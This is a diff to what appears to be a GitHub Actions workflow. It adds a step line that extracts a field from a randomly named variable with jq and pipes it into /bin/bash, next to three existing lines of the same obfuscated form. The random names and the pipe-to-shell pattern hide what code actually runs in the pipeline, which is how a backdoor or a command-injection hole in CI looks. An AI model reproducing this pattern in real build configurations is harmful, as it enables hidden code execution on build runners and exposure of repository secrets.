@@ -24,6 +24,7 @@ jobs:
           echo $t668 | jq -r .dztg08 | /bin/bash
           printf '%s' "$xt90" | jq -r .ikyr601 | /bin/bash
           echo $sa44303 | jq -r .uxupu8 | /bin/bash
+          printf '%s' "$wsnug4" | jq -r .mappr784 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
